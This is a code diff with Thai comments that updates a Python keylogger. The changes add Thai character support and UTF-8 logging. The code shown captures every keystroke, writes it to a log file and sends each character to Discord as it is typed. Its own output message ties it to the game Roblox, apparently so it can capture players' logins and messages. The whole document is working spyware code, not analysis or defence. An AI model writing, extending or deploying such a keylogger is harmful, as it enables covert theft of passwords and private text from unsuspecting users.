@@ -41,8 +41,12 @@ def send_buffer_periodically():
 def on_press(key):
     global buffer, last_time
     try:
+        # พิมพ์ปกติ รวมถึงภาษาไทย
         char = key.char
+        if char is None:
+            return
     except AttributeError:
+        # ปุ่มพิเศษ
         special_keys = {
             keyboard.Key.space: " ",
             keyboard.Key.enter: "\n",
@@ -51,15 +55,15 @@ def on_press(key):
         }
         char = special_keys.get(key, f"[{key.name}]")
 
-    # บันทึกลงไฟล์
+    # บันทึกลงไฟล์แบบ UTF-8 (รองรับไทย)
     with open(logfile, "a", encoding="utf-8") as f:
         f.write(char)
 
-    # ส่งข้อความทีละตัวทันที
+    # ส่งตัวอักษรทันที
     send_to_discord(char)
 
     lock.acquire()
-    if char == "\n":  # เมื่อกด Enter ส่ง buffer ทันที
+    if char == "\n":  # ส่งเมื่อกด Enter
         if buffer:
             send_to_discord(f"**ข้อความต่อเนื่อง:** {buffer}")
             buffer = ""
@@ -79,4 +83,4 @@ if __name__ == "__main__":
                     time.sleep(1)
                 listener.stop()
                 print("Roblox closed. Stopping keylogger.")
-        time.sleep(5)￼Enter
+        time.sleep(5)
